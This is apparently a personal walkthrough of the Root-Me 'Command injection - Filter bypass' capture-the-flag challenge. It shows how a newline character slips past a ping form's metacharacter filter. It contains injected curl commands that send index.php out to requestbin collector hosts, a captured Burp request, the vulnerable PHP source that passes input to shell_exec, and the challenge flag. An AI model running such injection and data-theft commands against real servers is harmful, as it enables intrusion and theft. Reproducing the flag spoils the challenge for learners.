# Command injection - Filter bypass(Front end Filter can be checked in web dev tool, and bypassed by j

Reference: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using\_XMLHttpRequest

Initial Page:&#x20;

Statement

Find a vulnerability in this service and exploit it. Some protections were added.

The flag is on the index.php file.

At first I sent 1.1.1.1; (In web dev tool to check. since burp is proxy thus not showing the modified input)

so I sent "; ls

so I sent "ls"

when I sent ""

""""

meaning:

backslash was added to my input.

but after a bit of research, I found that there is no way I can bypass this filter without using javascript

\->

bypass the input filter by javascript on the dev tool's console:

```
client = new XMLHttpRequest();
client.open('POST', 'http://challenge01.root-me.org/web-serveur/ch53/', true);
client.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
client.send('ip=127.0.0.1%0a')
```

* using carriage return character. But when I tried to enter this in the input field it is sanitized.

Using this: https://requestbin.net/

g6hrxfqq0bbe9kty.b.requestbin.net

then modify the above codelet like this

client.send('ip=127.0.0.1%0acurl --data-urlencode "ip@index.php" g6hrxfqq0bbe9kty.b.requestbin.net');

(here ip is set already. Format: curl --data-urlencode "host@file" serverToReceive)

ip: Comma@nd\_1nJec7ion\_Fl@9\_1337\_Th3\_G@m3!!!

***

Actually you can just check the filter in the web dev tool and then use burp

```
POST /web-serveur/ch53/index.php HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch53/index.php
Cookie: _ga_SRYSKX09J7=GS1.1.1662358763.49.1.1662359774.0.0.0; _ga=GA1.1.536088429.1661133467; PHPSESSID-APACHE2RCE=dk4prr41kcupilkagb5d6po38i
Upgrade-Insecure-Requests: 1

ip=127.0.0.1§test§
```

capture the request and then add this iterator

use metacharacters to fuzz, then you can see %0a can be used to bypass filter.

then after that

make requestbin.net

`ip=127.0.0.1%0acurl+-X+POST+-F+file%3d%40index.php+yej0o5wu44e1gf8u.b.requestbin.net`

curl -X POST -F file=@index.php yej0o5wu44e1gf8u.b.requestbin.net

:

curl -X POST -F file=@index.php yej0o5wu44e1gf8u.b.requestbin.net

transfer a URL

\-X, --request (HTTP) Specifies a custom request method to use when communicating with the HTTP server. The specified request will be used instead of the method otherwise used (which defaults to GET). Read the HTTP 1.1 specification for details and explanations. Common additional HTTP requests include PUT and DELETE, but related technologies like WebDAV offers PROPFIND, COPY, MOVE and more.

```
   (FTP) Specifies a custom FTP command to use instead of LIST when doing file lists with FTP.

   If this option is used several times, the last one will be used.
```

\-F, --form \<name=content> (HTTP) This lets curl emulate a filled-in form in which a user has pressed the submit button. This causes curl to POST data using the Content-Type multipart/form-data according to RFC 2388. This enables uploading of binary files etc. To force the 'content' part to be a file, prefix the file name with an @ sign. To just get the content part from a file, prefix the file name with the symbol <. The difference between @ and < is then that @ makes a file get attached in the post as a file upload, while the < makes a text field and just get the contents for that text field from a file.

`b'--------------------------0ce912bc5033004d\r\nContent-Disposition: form-data; name="file"; filename="index.php"\r\nContent-Type: application/octet-stream\r\n\r\n<html>\n<head>\n<title>Ping Service</title>\n</head>\n<body>\n<form method="POST" action="index.php">\n <input type="text" name="ip" placeholder="127.0.0.1">\n <input type="submit">\n</form>\n<pre>\n<?php \n$flag = "".file_get_contents(".passwd")."";\n\nif(isset($_POST["ip"]) && !empty($_POST["ip"])){\n $ip = @preg_replace("/[\\\\\\$|`;&<>]/", "", $\_POST\["ip"]);\n\t//$ip = @str\_replace(\['\\\\', '$', '|', '`\', \';\', \'&\', \'<\', \'>\'], "", $_POST["ip"]);\n $response = @shell_exec("timeout 5 bash -c \'ping -c 3 ".$ip."\'");\n $receive = @preg_match("/3 packets transmitted, (.*) received/s",$response,$out);\n\n if ($out[1]=="3") \n {\n echo "Ping OK";\n }\n elseif ($out[1]=="0")\n {\n echo "Ping NOK";\n }\n else\n {\n echo "Syntax Error";\n }\n}\n?>\n</pre>\n</body>\n</html>\n\n\r\n--------------------------0ce912bc5033004d--\r\n'`

string replacement can be observed.
